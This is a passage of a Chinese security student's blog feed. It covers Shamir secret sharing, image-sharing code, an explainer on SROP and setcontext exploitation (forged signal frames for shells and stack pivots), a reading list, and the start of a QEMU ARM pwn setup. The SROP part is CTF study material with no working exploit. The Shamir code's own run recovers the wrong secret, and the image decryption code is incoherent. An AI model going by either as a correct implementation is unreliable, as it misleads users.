    
    <content type="html"><![CDATA[<blockquote><p>网络信息安全上机作业罢了，人已经麻了</p></blockquote><h2 id="shamir秘密共享协议"><a href="#shamir秘密共享协议" class="headerlink" title="shamir秘密共享协议"></a>shamir秘密共享协议</h2><h3 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h3><p>假设有秘密S要保护，任意取t-1个随机数，构造如下多项式： <img src="https://www.zhihu.com/equation?tex=f(x)=a_0+a_1x+a_2x%5E2+%5Ccdots+a_%7Bt-1%7Dx%5E%7Bt-1%7D" alt="[公式]"> ，其中， <img src="https://www.zhihu.com/equation?tex=a_0=S" alt="[公式]"> ，所有运算均在有有限域中进行。</p><ul><li>取任意n个数， <img src="https://www.zhihu.com/equation?tex=x_1,x_2,%5Ccdots,x_n" alt="[公式]"> 分别带入多项式，得到 <img src="https://www.zhihu.com/equation?tex=f(x_1),f(x_2),%5Ccdots+f(x_n)" alt="[公式]"> 。</li><li>将 <img src="https://www.zhihu.com/equation?tex=(x_1,f(x_1)),%5Ccdots+,(x_n,f(x_n))" alt="[公式]"> 分发给n个服务器上。</li></ul><h3 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h3><p>从任意t个服务器上取得数据，假设取得 <img src="https://www.zhihu.com/equation?tex=(x_1,y_1),%5Ccdots+,(x_t,y_t)" alt="[公式]"> ，带入并求解多项式系数；<br><img src="https://www.zhihu.com/equation?tex=%5Cbegin%7Baligned%7D+a_0+a_1x_1+%5Ccdots+,a_%7Bt-1%7Dx_1%5E%7Bt-1%7D=y_1+%5C%5C+a_0+a_1x_2+%5Ccdots+,a_%7Bt-1%7Dx_2%5E%7Bt-1%7D=y_2+%5C%5C+%5Ccdots+%5C%5C+a_0+a_1x_t+%5Ccdots+,a_%7Bt-1%7Dx_%7Bt%7D%5E%7Bt-1%7D=y_%7Bt%7D+%5C%5C+%5Cend%7Baligned%7D" alt="[公式]"><br>用矩阵乘法表示为：<br><img src="/img/article/shamir/matrix.png" alt="img"><br>在求得 <img src="https://www.zhihu.com/equation?tex=a_0,a_1,%5Ccdots,a_%7Bt-1%7D" alt="[公式]"> 之后便可以构造出多项式 <img src="https://www.zhihu.com/equation?tex=f(x)=a_0+a_1x+a_2x%5E2+%5Ccdots+a_%7Bt-1%7Dx%5E%7Bt-1%7D" alt="[公式]"></p><p>将 <img src="https://www.zhihu.com/equation?tex=x=0" alt="[公式]"> 带入到多项式中，可以求的原秘密 <img src="https://www.zhihu.com/equation?tex=S=a_0" alt="[公式]"></p><h3 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> ceil<br><span class="hljs-keyword">from</span> decimal <span class="hljs-keyword">import</span> Decimal<br><span class="hljs-keyword">import</span> random<br><br><span class="hljs-comment">##测试数据</span><br><span class="hljs-built_in">max</span> = <span class="hljs-number">1000000</span><br>t = <span class="hljs-number">5</span><br>n = <span class="hljs-number">8</span><br>secret = <span class="hljs-number">31298123678</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;before:&#x27;</span>,secret)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ENCRYPTING.......&#x27;</span>)<br><span class="hljs-comment">##构造多项式f(x)</span><br>fx = [random.randrange(<span class="hljs-number">0</span>,<span class="hljs-built_in">max</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(t-<span class="hljs-number">1</span>)]<br>fx.append(secret)<br><br><span class="hljs-comment">##任取n个x，分别带入多项式，产生对应的(x,y)</span><br>share = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>    x = random.randrange(<span class="hljs-number">1</span>,<span class="hljs-built_in">max</span>)<br>    y = <span class="hljs-number">0</span> <br>    <span class="hljs-keyword">for</span> idx, value <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(fx[::-<span class="hljs-number">1</span>]):<br>        y += value * x**idx<br>    share.append((x,y))         <span class="hljs-comment">##每人分到的(x,y)序列</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;share:(&#x27;</span>,x,<span class="hljs-string">&#x27;,&#x27;</span>,y,<span class="hljs-string">&#x27;)&#x27;</span>)<br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;DECRYPTING......&#x27;</span>)<br><span class="hljs-comment">##任取t个(x,y)序列,并解密</span><br>key = random.sample(share,t)<br><span class="hljs-built_in">sum</span> =<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i, key_i <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(key):<br>    x_i,y_i = key_i<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;key:(&#x27;</span>,x_i,<span class="hljs-string">&#x27;,&#x27;</span>,y_i,<span class="hljs-string">&#x27;)&#x27;</span>)<br>    temp = Decimal(<span class="hljs-number">1</span>)<br>    <br>    <span class="hljs-keyword">for</span> j, key_j <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(key):<br>        x_j,y_j = key_j<br>        <span class="hljs-keyword">if</span> i != j:<br>            temp *= Decimal(Decimal(x_j)/Decimal(x_j-x_i))<br>    temp *= y_i<br>    <span class="hljs-built_in">sum</span> += Decimal(temp)<br><br><span class="hljs-built_in">sum</span> = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">round</span>(Decimal(<span class="hljs-built_in">sum</span>),<span class="hljs-number">0</span>))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;after:&#x27;</span>,<span class="hljs-built_in">sum</span>)<br></code></pre></td></tr></table></figure><h4 id="运行示范"><a href="#运行示范" class="headerlink" title="运行示范"></a>运行示范</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌─[loorain@ubuntu] - [~/crypto/shamir] - [2304]shamir<br>└─[$] python3 shamir.py                                                                                                                                                                                             [20:33:27]<br>before: 31298123678<br>ENCRYPTING.......<br>share:( 385490 , 19613871609040056923504678528 )<br>share:( 208439 , 1676593182288704748621405212 )<br>share:( 111980 , 139661059121519203627546778 )<br>share:( 287787 , 6092505271995476798344376612 )<br>share:( 57978 , 10036212148635231635583656 )<br>share:( 8027 , 3687858811716396682052 )<br>share:( 640969 , 149919642500298401999699916572 )<br>share:( 444105 , 34550423234050839227167648028 )<br>DECRYPTING......<br>key:( 444105 , 34550423234050839227167648028 )<br>key:( 111980 , 139661059121519203627546778 )<br>key:( 208439 , 1676593182288704748621405212 )<br>key:( 287787 , 6092505271995476798344376612 )<br>key:( 385490 , 19613871609040056923504678528 )<br>after: 31298123800<br></code></pre></td></tr></table></figure><h2 id="图像加密隐写"><a href="#图像加密隐写" class="headerlink" title="图像加密隐写"></a>图像加密隐写</h2><blockquote><p>这里用0-255的矩阵模拟灰度图像</p></blockquote><h3 id="加密过程-1"><a href="#加密过程-1" class="headerlink" title="加密过程"></a>加密过程</h3><p><img src="/img/article/shamir/cry.png" alt="加密示意图"></p><p>随机生成 O 和 S，并计算 d 和 si</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">S_img = rd.randint(<span class="hljs-number">0</span>,<span class="hljs-number">256</span>,(<span class="hljs-number">10</span>,<span class="hljs-number">10</span>))<br>O_img = rd.randint(<span class="hljs-number">0</span>,<span class="hljs-number">256</span>,(<span class="hljs-number">20</span>,<span class="hljs-number">20</span>))<br>Q_img = rd.randint(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,(<span class="hljs-number">20</span>,<span class="hljs-number">20</span>))<br>m = number.getPrime(<span class="hljs-number">4</span>) <span class="hljs-comment">#随机生成一个素数m</span><br><br>d = O_img % m<br>S_i = S_img % m<br></code></pre></td></tr></table></figure><p>生成Q</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">20</span>):<br>        Q_img[i,j] = math.floor(O_img[i,j] / m) * m<br></code></pre></td></tr></table></figure><p>生成y &#x3D; f(x),求得y与Q相加的到n个Oi</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">O_i = []<br><span class="hljs-comment">##生成y = f(x),求得y与Q相加的到n个Oi</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">400</span>):<br>    key = random.randrange(<span class="hljs-number">1</span>,<span class="hljs-built_in">max</span>)<br>    y = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>            y += S_i[i,j]* (key ** (i*<span class="hljs-number">10</span>+j))<br>    y += d[n] * (key ** (i*<span class="hljs-number">10</span>+j))<br>    O_i.append((Q_img + y)) <br></code></pre></td></tr></table></figure><h3 id="解密过程-1"><a href="#解密过程-1" class="headerlink" title="解密过程"></a>解密过程</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">101</span>):<br>    Q_img.append((O_i[i, <span class="hljs-number">0</span>] // m) * m)<br>    so1.append(d[i] - (O_i[i, <span class="hljs-number">0</span>] // m) * m)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">101</span>):<br>    d.append(Q_img[i])<br>sol = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">101</span>):<br>    d1 = np(<span class="hljs-number">0</span>,m,(<span class="hljs-number">10</span>, <span class="hljs-number">10</span>)) <br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>            d1[j, k] = S_img[i, j]**k<br>    sol.append(d1.solve_right(O_img[i])[<span class="hljs-number">0</span>])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">101</span>):<br>    <span class="hljs-keyword">assert</span> sol[i]&gt;m<br>solve = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">101</span>):<br>    solve.append(so1[i]+Q_img[i])<br><span class="hljs-built_in">print</span>(solve == d)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>setcontext &amp; SROP</title>
    <link href="/2022/06/05/srop/"/>
    <url>/2022/06/05/srop/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>SROP(Sigreturn Oriented Programming) 于 2014 年被 Vrije Universiteit Amsterdam 的 Erik Bosman 提出，其相关研究<strong>Framing Signals — A Return to Portable Shellcode</strong> 其中相关的 paper 以及如下：<br><a href="https://www.ieee-security.org/TC/SP2014/papers/FramingSignals-AReturntoPortableShellcode.pdf">paper</a></p></blockquote><h2 id="机制详解"><a href="#机制详解" class="headerlink" title="机制详解"></a>机制详解</h2><p>signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。一般来说，信号机制常见的步骤如下图所示：</p><p><img src="/img/article/srop/srop1.png" alt="Untitled"></p><ol><li>内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。</li><li>内核会为该进程保存相应的上下文，<strong>主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 <code>sigreturn</code> 的系统调用地址</strong>。此时栈的结构如下图所示，我们称 <code>ucontext</code> 以及 <code>siginfo</code> 这一段为 <strong>Signal Frame</strong>。<strong>需要注意的是，这一部分是在用户进程的地址空间的。</strong>之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 <code>sigreturn</code> 代码。</li><li><code>signal handler</code> 返回后，内核为执行 <code>sigreturn</code> 系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。其中，32 位的 <code>sigreturn</code> 的调用号为 77，64 位的系统调用号为 15。</li></ol><p><img src="/img/article/srop/srop2.png" alt="Untitled"></p><p>上述谈到的从栈中POP出寄存器内容的过程由 <code>setcontext</code> 函数实现，如下图所示：</p><p><img src="/img/article/srop/srop3.png" alt="Untitled"></p><p>我们可以看到，从指令<code>mov rsp, [rdi+0A0h]</code>开始，便是一连串对于寄存器的恢复操作。而且结构由Signal Frame结构体实现，以下是结构源码</p><p><strong>X86</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigcontext</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> gs, __gsh;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> fs, __fsh;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> es, __esh;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> ds, __dsh;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> edi;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> esi;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ebp;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> esp;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ebx;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> edx;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ecx;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> eax;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> trapno;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> err;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> eip;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> cs, __csh;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> eflags;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> esp_at_signal;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> ss, __ssh;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">fpstate</span> * <span class="hljs-title">fpstate</span>;</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> oldmask;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> cr2;<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>X64</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">fpstate</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-comment">/* FPU environment matching the 64-bit FXSAVE layout.  */</span><br>  <span class="hljs-type">__uint16_t</span>        cwd;<br>  <span class="hljs-type">__uint16_t</span>        swd;<br>  <span class="hljs-type">__uint16_t</span>        ftw;<br>  <span class="hljs-type">__uint16_t</span>        fop;<br>  <span class="hljs-type">__uint64_t</span>        rip;<br>  <span class="hljs-type">__uint64_t</span>        rdp;<br>  <span class="hljs-type">__uint32_t</span>        mxcsr;<br>  <span class="hljs-type">__uint32_t</span>        mxcr_mask;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">fpxreg</span>    _<span class="hljs-title">st</span>[8];</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">xmmreg</span>    _<span class="hljs-title">xmm</span>[16];</span><br>  <span class="hljs-type">__uint32_t</span>        padding[<span class="hljs-number">24</span>];<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigcontext</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">__uint64_t</span> r8;<br>  <span class="hljs-type">__uint64_t</span> r9;<br>  <span class="hljs-type">__uint64_t</span> r10;<br>  <span class="hljs-type">__uint64_t</span> r11;<br>  <span class="hljs-type">__uint64_t</span> r12;<br>  <span class="hljs-type">__uint64_t</span> r13;<br>  <span class="hljs-type">__uint64_t</span> r14;<br>  <span class="hljs-type">__uint64_t</span> r15;<br>  <span class="hljs-type">__uint64_t</span> rdi;<br>  <span class="hljs-type">__uint64_t</span> rsi;<br>  <span class="hljs-type">__uint64_t</span> rbp;<br>  <span class="hljs-type">__uint64_t</span> rbx;<br>  <span class="hljs-type">__uint64_t</span> rdx;<br>  <span class="hljs-type">__uint64_t</span> rax;<br>  <span class="hljs-type">__uint64_t</span> rcx;<br>  <span class="hljs-type">__uint64_t</span> rsp;<br>  <span class="hljs-type">__uint64_t</span> rip;<br>  <span class="hljs-type">__uint64_t</span> eflags;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> cs;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> gs;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> fs;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> __pad0;<br>  <span class="hljs-type">__uint64_t</span> err;<br>  <span class="hljs-type">__uint64_t</span> trapno;<br>  <span class="hljs-type">__uint64_t</span> oldmask;<br>  <span class="hljs-type">__uint64_t</span> cr2;<br>  __extension__ <span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">    &#123;</span><br>      <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">fpstate</span> * <span class="hljs-title">fpstate</span>;</span><br>      <span class="hljs-type">__uint64_t</span> __fpstate_word;<br>    &#125;;<br>  <span class="hljs-type">__uint64_t</span> __reserved1 [<span class="hljs-number">8</span>];<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><h3 id="直接getshell"><a href="#直接getshell" class="headerlink" title="直接getshell"></a>直接getshell</h3><p><strong>示意图</strong></p><p><img src="/img/article/srop/srop4.png" alt="Untitled"></p><p>我们可以直接在栈上伪造Signal Frame，利用syscall(0xF)来触发对于伪造寄存器的恢复，在<code>setcontext</code> 执行完毕后，便会getshell（或利用栈转移到其他地址也可以，但无论怎样都要保证在syscall时，rsp需指向Fake Frame 的开头)</p><h3 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h3><p>在上面直接getshell的基础上，我们可以自然的想到，通过不断伪造sigframe可以实现类似ROP的效果，只需要将其中rsp控制到下一个fakeframe的开头,rip加上ret即可。</p><p><strong>示意图</strong></p><p><img src="/img/article/srop/srop5.png" alt="Untitled"></p><h3 id="栈转移"><a href="#栈转移" class="headerlink" title="栈转移"></a>栈转移</h3><p>由于其可以轻易的控制几乎所有寄存器的值，栈转移这样的操作也可以轻松实现</p><h3 id="堆中直接利用setcontext"><a href="#堆中直接利用setcontext" class="headerlink" title="堆中直接利用setcontext"></a>堆中直接利用setcontext</h3><p>在面对堆题目时，我们很难直接在栈上构造内容并且控制rsp指向frame开头。此时可以直接通过劫持hook为<code>setcontext+53</code> 处(<strong>mov rsp, [rdi+0A0h]</strong>)，直接触发对于寄存器的一系列pop操作。且由于free时，rip指向chunk的mem域，那么我们只需要在将要free的chunk里写上Fake Frame，并合理控制与rip的距离即可。</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>平台题目SROP、 ciscn 2021 silverwolf</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>我的必读书目表(仍在更新)</title>
    <link href="/2022/06/05/%E3%80%8A%E6%A0%BC%E8%B0%83%EF%BC%9A%E7%A4%BE%E4%BC%9A%E7%AD%89%E7%BA%A7%E4%B8%8E%E7%94%9F%E6%B4%BB%E5%93%81%E5%91%B3%E3%80%8B/"/>
    <url>/2022/06/05/%E3%80%8A%E6%A0%BC%E8%B0%83%EF%BC%9A%E7%A4%BE%E4%BC%9A%E7%AD%89%E7%BA%A7%E4%B8%8E%E7%94%9F%E6%B4%BB%E5%93%81%E5%91%B3%E3%80%8B/</url>
    
    <content type="html"><![CDATA[<h2 id="《格调：社会等级与生活品味》"><a href="#《格调：社会等级与生活品味》" class="headerlink" title="《格调：社会等级与生活品味》"></a>《格调：社会等级与生活品味》</h2><blockquote><p>上世纪末期美国社会结构，对于现在的我们仍有许多警醒之处。</p></blockquote><hr><h2 id="《加速》"><a href="#《加速》" class="headerlink" title="《加速》"></a>《加速》</h2><blockquote><p>本书讲解了现代社会中时间结构的改变，深入的揭示了现代社会中许多现象的本质原因。</p></blockquote><hr><h2 id="《新异化的诞生》"><a href="#《新异化的诞生》" class="headerlink" title="《新异化的诞生》"></a>《新异化的诞生》</h2><blockquote><p>社会加速批判理论大纲，辩证的思考当代人们的生活。</p></blockquote><hr><h2 id="《深入理解计算机系统》"><a href="#《深入理解计算机系统》" class="headerlink" title="《深入理解计算机系统》"></a>《深入理解计算机系统》</h2><blockquote><p>计算机底层原理,学计算机不读CSAPP，等于没学（doge）。</p></blockquote><hr><h2 id="《C-反汇编与逆向分析技术揭秘》"><a href="#《C-反汇编与逆向分析技术揭秘》" class="headerlink" title="《C++反汇编与逆向分析技术揭秘》"></a>《C++反汇编与逆向分析技术揭秘》</h2><blockquote><p>本书既是一本全面而系统地讲解反汇编与逆向分析技术的安全类专著，又是一部深刻揭示C++内部工作机制的程序设计类著作。</p></blockquote><hr><h2 id="《高级编译器设计与实现》"><a href="#《高级编译器设计与实现》" class="headerlink" title="《高级编译器设计与实现》"></a>《高级编译器设计与实现》</h2><blockquote><p>本书业内俗称“鲸书”，它是编译器领域最为经典的三本书之一，但内容更突出编译器的后端优化部分。</p></blockquote><hr><h2 id="《乌合之众》"><a href="#《乌合之众》" class="headerlink" title="《乌合之众》"></a>《乌合之众》</h2><blockquote><p>我们作为独立的个人，如何在纷纷扰扰的信息社会中保持冷静，不被乌合之众所裹挟，辩证地读完这本书，保持独立的思考，相信你能有所收获。</p></blockquote><hr><h2 id="《娱乐至死》"><a href="#《娱乐至死》" class="headerlink" title="《娱乐至死》"></a>《娱乐至死》</h2><blockquote><p>在该书中，波兹曼深入剖析了以电视为主的新媒体对人思想认识、认知方法乃至整个社会文化发展趋向的影响，令人深省，并认识到媒介危机。</p></blockquote><hr><h2 id="《Linux-二进制分析》"><a href="#《Linux-二进制分析》" class="headerlink" title="《Linux 二进制分析》"></a>《Linux 二进制分析》</h2><blockquote><p>本书深入的剖析了 Linux ELF的工作机制，有助于信息安全从业人员更好的分析漏洞、病毒以及恶意软件，从而找到相应的解决方案。</p></blockquote><hr><h2 id="《程序员的自我修养》"><a href="#《程序员的自我修养》" class="headerlink" title="《程序员的自我修养》"></a>《程序员的自我修养》</h2><blockquote><p>我不是一个合格的程序员😭</p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>QEMU &amp; arm 简易pwn环境搭建</title>
    <link href="/2022/06/05/QEMU%20&amp;%20arm%20%E7%AE%80%E6%98%93pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2022/06/05/QEMU%20&amp;%20arm%20%E7%AE%80%E6%98%93pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<blockquote><p>填坑了，填坑了！学了堆之后很久没有学新东西了，来入门下arm架构下的PWN，为国赛打一点基础。</p></blockquote><h2 id="环境搭建-Ubuntu-20-04"><a href="#环境搭建-Ubuntu-20-04" class="headerlink" title="环境搭建(Ubuntu 20.04)"></a>环境搭建(Ubuntu 20.04)</h2><h3 id="安装QEMU"><a href="#安装QEMU" class="headerlink" title="安装QEMU"></a>安装QEMU</h3><blockquote><p>QEMU是一种通用的开源计算机仿真器和虚拟器。QEMU共有两种操作模式<br><strong>全系统仿真</strong>：能够在任意支持的架构上为任何机器运行一个完整的操作系统<br><strong>用户模式仿真</strong>：能够在任意支持的架构上为另一个Linux&#x2F;BSD运行程序 因此我们可以在linux操作系统中安装它，然后用它来调试其它架构平台的程序。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##首先安装qemu</span><br>sudo apt update<br>sudo apt install qemu<br></code></pre></td></tr></table></figure><p>安装好后可以用tab补全看看是否正确安装。在安装qemu后，对于静态链接的arm程序就已经可以直接运行了，使用命令<code>qemu-arm prog</code>运行32位的arm程序，其中prog指代程序名,对于64位程序使用<code>qemu-aarch64</code>但对于动态链接的程序还是无法正常运行，此时需要安装对应架构的动态链接库才可以正常运行。</p><p><img src="/img/article/qemu-arm/qemu.png" alt="Untitled"></p><h3 id="安装动态链接库"><a href="#安装动态链接库" class="headerlink" 